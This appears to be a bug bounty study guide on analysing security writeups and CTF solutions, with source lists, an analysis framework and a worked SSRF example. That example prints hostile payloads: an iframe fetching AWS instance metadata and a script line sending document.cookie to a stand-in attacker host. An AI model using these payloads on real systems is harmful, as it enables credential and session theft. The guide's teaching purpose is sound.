# WRITEUP-ANALYSIS.md — Learning from Bug Bounty Writeups & CTFs

> How to systematically read, analyze, and extract reusable techniques from published security writeups and CTF solutions.

---

## 🎯 Why Read Writeups?

Writeups are the **fastest way to level up** as a bug bounty hunter. Each writeup is a condensed lesson from someone who found a real vulnerability. You learn:
- What to look for
- How to think about the problem
- Creative techniques you'd never think of alone
- How to chain vulnerabilities
- How to write good reports

---

## 📚 Where to Find Writeups

### Bug Bounty Writeups
| Source | URL | Notes |
|--------|-----|-------|
| HackerOne Hacktivity | hackerone.com/hacktivity | Real disclosed reports |
| Bugcrowd Crowdstream | bugcrowd.com/crowdstream | Disclosed findings |
| Medium (Bug Bounty tag) | medium.com/tag/bug-bounty | Hunter blog posts |
| InfoSec Writeups | infosecwriteups.com | Curated collection |
| Pentester Land | pentester.land/list-of-bug-bounty-writeups | Massive curated list |
| Bug Bounty POC | bugbountypoc.com | PoC collection |

### CTF Writeups
| Source | URL | Notes |
|--------|-----|-------|
| CTFtime | ctftime.org/writeups | All major CTF writeups |
| GitHub CTF Repos | github.com/topics/ctf-writeups | Community writeups |
| LiveOverflow | youtube.com/@LiveOverflow | Video explanations |
| John Hammond | youtube.com/@_JohnHammond | CTF walkthroughs |
| IppSec | youtube.com/@ippsec | HackTheBox walkthroughs |

### Security Research
| Source | URL | Notes |
|--------|-----|-------|
| PortSwigger Research | portswigger.net/research | World-class web research |
| Project Zero | googleprojectzero.blogspot.com | Google's elite team |
| Trail of Bits | blog.trailofbits.com | Deep technical research |
| Assetnote | blog.assetnote.io | Attack surface research |
| Detectify Labs | labs.detectify.com | Web security research |

---

## 📖 How to Analyze a Writeup

### Step-by-Step Analysis Framework

```
For each writeup, extract:

1. TARGET CONTEXT
   - What type of application? (web app, API, mobile, infra)
   - What technology stack?
   - What was the scope?

2. DISCOVERY PROCESS
   - How did they find the entry point?
   - What recon did they do?
   - What made them look at this specific feature?

3. VULNERABILITY DETAILS
   - What class of vulnerability?
   - What was the root cause?
   - What input/parameter was vulnerable?
   - What was the vulnerable code doing?

4. EXPLOITATION
   - How did they exploit it?
   - What payloads did they use?
   - Did they chain multiple issues?
   - How did they bypass protections?

5. IMPACT
   - What could an attacker do?
   - How was business impact demonstrated?
   - What was the severity/CVSS?

6. LESSONS LEARNED
   - What technique can I reuse?
   - What should I add to my testing checklist?
   - What assumptions were broken?
   - How can I automate detection of this?

7. REMEDIATION
   - How was it fixed?
   - What's the proper defense?
```

### Example Analysis
```
📝 WRITEUP: "How I Found an SSRF in [Company] via PDF Generation"

TARGET: Web app with PDF export feature
TECH: Node.js, Puppeteer (headless Chrome for PDF generation)

DISCOVERY: Tester noticed PDF export feature. Wondered: "What renders the PDF?"
Tested by injecting HTML/CSS into the content being exported.

VULNERABILITY: SSRF via HTML injection in PDF generator
- User input was rendered by headless Chrome
- Injected <iframe src="http://169.254.169.254/latest/meta-data/">
- PDF contained AWS metadata!

CHAIN: HTML Injection → SSRF → AWS Metadata → IAM Credentials → Cloud Compromise

LESSONS:
✅ Always test PDF/document generation features for SSRF
✅ Headless browser = full browser capabilities = SSRF, XSS, file read
✅ Check for cloud metadata access in any SSRF
✅ PDF generators are high-value targets

REUSABLE TECHNIQUE:
- Inject <img src="http://collaborator.net"> in any field that generates PDFs
- Inject <iframe>, <link>, <script src=> for SSRF
- Use <script>document.location="http://attacker.com/?c="+document.cookie</script>
```

---

## 🧠 Technique Extraction Template

When you find a useful technique in a writeup, document it:

```
TECHNIQUE: [Name]
CATEGORY: [XSS/SQLi/SSRF/Logic/etc.]
APPLICABILITY: [When to use this]
PREREQUISITES: [What conditions must exist]
DETECTION: [How to find if target is vulnerable]
EXPLOITATION: [Step-by-step exploit]
PAYLOADS: [Specific payloads to use]
CHAINING: [What to chain it with]
AUTOMATION: [How to automate detection]
```

---

## 🏆 Top Techniques from Famous Writeups

### 1. Orange Tsai's SSRF Research
- Exploiting URL parsers differences between libraries
- Protocol smuggling via gopher://
- Abusing redirect chains for SSRF bypass

### 2. James Kettle's HTTP Desync Attacks
- Request smuggling via CL.TE and TE.CL
- Cache poisoning via request smuggling
- Web cache deception attacks

### 3. Gareth Heyes' XSS Research
- Mutation XSS (mXSS) techniques
- Browser parser differential exploitation
- CSP bypass via JSONP and Angular

### 4. Sam Curry's Account Takeover Chains
- OAuth misconfiguration exploitation
- Password reset poisoning
- Multi-step account takeover chains

### 5. Bug Bounty Methodology by Jason Haddix
- Comprehensive recon methodology
- Content discovery techniques
- Parameter analysis and fuzzing strategies
